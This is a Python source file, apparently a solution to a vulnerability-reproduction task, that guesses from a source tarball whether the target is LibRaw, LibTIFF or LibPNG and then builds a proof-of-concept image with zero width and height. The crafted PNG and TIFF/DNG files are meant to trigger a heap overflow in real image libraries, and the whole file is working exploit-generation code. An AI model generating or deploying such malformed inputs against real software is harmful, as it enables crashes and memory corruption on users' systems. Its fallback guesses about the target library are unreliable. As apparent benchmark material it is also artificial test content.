import tarfile
import struct
import zlib
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is described as "zero width or height images are not checked".
        This typically affects image processing libraries like LibRaw, LibTIFF, or LibPNG.
        We attempt to detect the library from the source tarball and generate a format-compliant
        image with 0 dimensions.
        """
        is_libraw = False
        is_libtiff = False
        is_libpng = False
        
        try:
            # Attempt to identify the library by peeking at filenames in the tarball
            with tarfile.open(src_path, 'r') as tar:
                # Check first 200 members to identify project
                count = 0
                for m in tar:
                    name = m.name.lower()
                    if "libraw" in name or "dcraw" in name:
                        is_libraw = True
                        break
                    if "tiff" in name and ("libtiff" in name or "tif_" in name):
                        is_libtiff = True
                        break
                    if "png" in name and ("libpng" in name or "png_" in name):
                        is_libpng = True
                        break
                    count += 1
                    if count > 200:
                        break
        except Exception:
            # Fallback assumption if tar processing fails
            # LibRaw is a frequent target for this specific type of heap overflow description
            is_libraw = True

        if is_libpng:
            return self._gen_png()
        elif is_libtiff:
            # Generate a standard Grayscale TIFF with 0x0 dimensions
            return self._gen_tiff_base(0, 0, 1, 1, 8, is_dng=False)
        else:
            # Default to LibRaw: Generate a DNG (TIFF-based) with CFA configuration and 0x0 dimensions
            # DNG/CFA path is often where complex logic resides
            return self._gen_tiff_base(0, 0, 1, 32803, 12, is_dng=True)

    def _gen_png(self) -> bytes:
        # PNG Signature
        out = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk: Width=0, Height=0
        # Depth=8, Color=2 (Truecolor), Comp=0, Filter=0, Interlace=0
        ihdr_payload = struct.pack('>IIBBBBB', 0, 0, 8, 2, 0, 0, 0)
        crc = zlib.crc32(b'IHDR' + ihdr_payload) & 0xffffffff
        
        out += struct.pack('>I', len(ihdr_payload))
        out += b'IHDR'
        out += ihdr_payload
        out += struct.pack('>I', crc)
        
        # IEND chunk
        iend_payload = b''
        crc_end = zlib.crc32(b'IEND' + iend_payload) & 0xffffffff
        out += struct.pack('>I', 0)
        out += b'IEND'
        out += struct.pack('>I', crc_end)
        
        return out

    def _gen_tiff_base(self, w, h, spp, photo, bps, is_dng) -> bytes:
        # Construct a Little Endian TIFF
        header = b'II\x2a\x00\x08\x00\x00\x00'
        
        entries = []
        # Helper to add IFD entry: Tag, Type, Count, Value
        # Type 1=BYTE, 3=SHORT, 4=LONG
        add = lambda t, ty, c, v: entries.append((t, ty, c, v))
        
        # Tags must be sorted by ID for valid TIFF
        add(256, 4, 1, w)       # ImageWidth
        add(257, 4, 1, h)       # ImageLength
        add(258, 3, 1, bps)     # BitsPerSample
        add(259, 3, 1, 1)       # Compression (1=None)
        add(262, 3, 1, photo)   # PhotometricInterpretation
        
        # StripOffsets (Tag 273) placeholder, will update later
        add(273, 4, 1, 0)       
        
        add(277, 3, 1, spp)     # SamplesPerPixel
        add(278, 4, 1, 1)       # RowsPerStrip
        add(279, 4, 1, 1)       # StripByteCounts
        
        if is_dng:
            # DNGVersion (50706): Type BYTE(1), Count 4. Value 1.4.0.0
            # Packed into 4-byte value field as 0x01, 0x04, 0x00, 0x00 -> 0x00000401 (Little Endian)
            add(50706, 1, 4, 0x00000401)
            
        # Calculate data offset
        # Header (8) + Count (2) + Entries (12 * N) + NextIFD (4)
        ifd_size = 2 + len(entries) * 12 + 4
        data_offset = 8 + ifd_size
        
        # Update StripOffsets to point after IFD
        for i in range(len(entries)):
            if entries[i][0] == 273:
                entries[i] = (273, 4, 1, data_offset)
                break
        
        # Serialize IFD
        out = header
        out += struct.pack('<H', len(entries))
        for t, ty, c, v in entries:
            out += struct.pack('<HHII', t, ty, c, v)
        out += b'\x00\x00\x00\x00' # Next IFD offset (0)
        
        # Payload (minimal data)
        out += b'\x00' * 16 
        
        return out